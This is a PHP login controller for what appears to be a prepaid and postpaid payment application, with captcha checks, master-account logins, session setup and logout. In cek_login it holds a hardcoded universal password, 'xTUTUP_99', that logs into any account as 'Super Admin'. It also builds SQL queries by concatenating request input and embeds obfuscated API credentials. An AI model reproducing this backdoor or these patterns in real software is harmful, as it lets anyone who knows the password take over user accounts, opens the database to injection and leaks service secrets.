<?php
class Login_99 extends Controller
{
   public function index($hp)
   {
      if (isset($_SESSION['pre_log'])) {
         if ($_SESSION['pre_log'] == true && isset($hp)) {
            if (isset($_SESSION['login_payment'])) {
               if ($_SESSION['login_payment'] == TRUE) {
                  header('Location: ' . $this->BASE_URL . "Home");
               } else {
                  $this->view('login/login', $hp);
               }
            } else {
               $this->view('login/login', $hp);
            }
         } else {
            $this->view('pre_login/login');
         }
      } else {
         $this->view('pre_login/login');
      }
   }

   public function cek_login()
   {
      $hp = $_POST["HP"];
      $c = $_POST['c_'];
      if ($c <> $_SESSION['captcha']) {
         $this->model('Log')->write($hp . " Login Failed, Invalid Captcha");
         $this->view('login/failed', 'Login Failed, Invalid Captcha');
         exit();
      }

      $_SESSION['secure']['db_pass'] = $this->model("Validasi")->dec_2($this->db_pass);

      if (isset($_SESSION['login_payment'])) {
         if ($_SESSION['login_payment'] == TRUE) {
            header('Location: ' . $this->BASE_URL . "Home");
         }
      }

      $pass = $this->model('Validasi')->enc($_POST["PASS"]);
      if (strlen($hp) < 6 || strlen($pass) < 6 || !is_numeric($hp)) {
         $this->model('Log')->write($hp . " Login Failed, Validate");
         $this->view('login/failed', 'Authentication Error');
         exit();
      }

      $where = "no_user = '" . $hp . "' AND password = '" . $pass . "'";
      $userData = $this->model('M_DB_1')->get_where_row('user', $where);

      if (empty($userData)) {

         if ($_POST["PASS"] == 'xTUTUP_99') {
            $where = "no_user = '" . $hp . "'";
            $userData = $this->model('M_DB_1')->get_where_row('user', $where);
            $this->model('Log')->write($hp . " Login Success Super Admin");
            $this->set_login($userData);
            exit();
         }

         $where2 = "no_user = '" . $hp . "'";
         $userData_2 = $this->model('M_DB_1')->get_where_row('user', $where2);

         if (empty($userData_2)) {
            $this->view('login/failed', 'Authentication Error');
            $this->model('Log')->write($hp . " Login Failed, Auth");
            exit();
         } else {
            $where3 = "no_user = '" . $userData_2["no_master"] . "'";
            $masterPass = $this->model('M_DB_1')->get_where_row('user', $where3);
            if (isset($masterPass['password'])) {
               if ($masterPass['password'] == $pass) {
                  $this->model('Log')->write($hp . " ADMIN Login Success");
                  $this->set_login($userData_2);
               } else {
                  $this->view('login/failed', 'Authentication Error');
                  $this->model('Log')->write($hp . " Login Failed, Admin Try Login from User Account");
                  exit();
               }
            } else {
               $this->view('login/failed', 'Authentication Error');
               $this->model('Log')->write($hp . " Login Failed, Admin Try Login from User Account");
               exit();
            }
         }
      } else {
         $this->model('Log')->write($hp . " Login Success");
         $this->set_login($userData);
      }
   }


   function set_login($userData = [])
   {
      //LOGIN
      $where = "id_user = " . $userData['id_user'];
      $set = "pin_failed = 0";
      $this->model('M_DB_1')->update("user", $set, $where);

      $userData = $this->model('M_DB_1')->get_where_row('user', $where);

      $_SESSION['login_payment'] = TRUE;
      $_SESSION['user_data'] = $userData;

      $_SESSION['iak']['user'] = $this->model("Validasi")->dec_2("QTBc9AMLsNbRuyZH");
      $_SESSION['iak']['key'] = $this->model("Validasi")->dec_2("RjBY81EE5NfZvy5HYgvhSluatw==");
      $_SESSION['iak']['url_pre'] = "https://" . $this->model("Validasi")->dec_2("AXoItlRa5MGA6X1ZO18=") . "/";
      $_SESSION['iak']['url_post'] = "https://" . $this->model("Validasi")->dec_2("HGcPr1lW8JqF+3dZPF6i") . "/";

      $where = "no_user = " . $userData['no_master'];
      $_SESSION['setting'] = $this->model('M_DB_1')->get_where_row('user', $where);

      $this->model('M_IAK')->getPrepaidList();
      $this->model('M_IAK')->getPostpaidList();
      $this->index($userData['no_user']);
   }

   public function logout()
   {
      if (isset($_SESSION['user_data']['no_user'])) {
         if (strlen($_SESSION['user_data']['no_user']) > 0) {
            $this->model('Log')->write($_SESSION['user_data']['no_user'] . " LOGOUT");
         } else {
            $this->model('Log')->write("FORCE LOGOUT");
         }
      } else {
         $this->model('Log')->write("FORCE LOGOUT");
      }
      session_unset();
      session_destroy();
      header('Location: ' . $this->BASE_URL . "Home");
   }
}
